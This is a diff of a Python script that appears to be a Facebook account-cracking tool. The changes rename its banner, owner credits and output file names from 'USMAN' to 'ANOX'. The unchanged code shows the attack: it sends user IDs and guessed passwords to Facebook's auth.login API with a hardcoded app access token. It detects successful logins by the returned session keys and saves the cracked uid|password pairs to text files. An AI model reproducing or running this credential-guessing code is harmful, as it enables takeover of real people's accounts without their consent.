@@ -1,5 +1,5 @@
-#DECOMPILE BY USMAN
-#FILE NAME (USMAN-DEC)
+#DECOMPILE BY ANOX
+#FILE NAME ANOX-DEC)
 W = '\033[97;1m'
 R = '\033[91;1m'
 G = '\033[92;1m'
@@ -392,19 +392,11 @@ logo = """\033[1;30m
                   ▏▏▕▕
                 \033[1;31m ╭╰ ╮╭╰ ╮
                \033[1;39msᴜʙ \033[1;35mᴋᴀ \033[1;36mʙᴀᴀᴘ
+\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬
+/033[0;95m                       SYCOANOX 
 \033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-
-\033[1;31m██╗   ██╗███████╗███╗   ███╗ █████╗ ███╗   ██╗    
-\033[1;32m██║   ██║██╔════╝████╗ ████║██╔══██╗████╗  ██║    
-\033[1;33m██║   ██║███████╗██╔████╔██║███████║██╔██╗ ██║    
-\033[1;34m██║   ██║╚════██║██║╚██╔╝██║██╔══██║██║╚██╗██║    
-\033[1;35m╚██████╔╝███████║██║ ╚═╝ ██║██║  ██║██║ ╚████║    
- \033[1;36m╚═════╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝    
-                                                  
-
-\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●\033[1;37m๑۩♡۩๑\033[0;95m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR USMAN
-\033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32mUSMAN CREATION
+\033[1;39m━▷ \033[0;91m𝙊𝙒𝙉𝙀𝙍    \033[1;39m◈✙◈\033[1;33m MR ANOX
+\033[1;39m━▷ \033[0;91m𝙔𝙊𝙐𝙏𝙐𝘽𝙀  \033[1;39m◈✙◈ \033[1;32mANOX CREATION
 \033[1;39m━▷ \033[0;91m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆 \033[1;39m◈✙◈ \033[1;33mSYCO
 \033[1;39m━▷ \033[0;91m𝙁𝘽 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;34mFREE COMMAND BY USMAN 🙂🙈
 \033[1;39m━▷ \033[0;91m𝙒𝙋 𝙂𝙍𝙊𝙐𝙋 \033[1;39m◈✙◈ \033[1;35mSTARTING EXIT SELECT AND JOIN
@@ -892,15 +884,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAA" in response.text:
-				print("\r \033[0;92m[USMAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ANOX-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-USMAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[USMAN-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ANOX-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-USMAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-ANOX-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1323,15 +1315,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[USMAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ANOX-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-USMAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-ANOX-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;93m[USMAN-OK] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;93m[ANOX-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-USMAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-ANOX-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
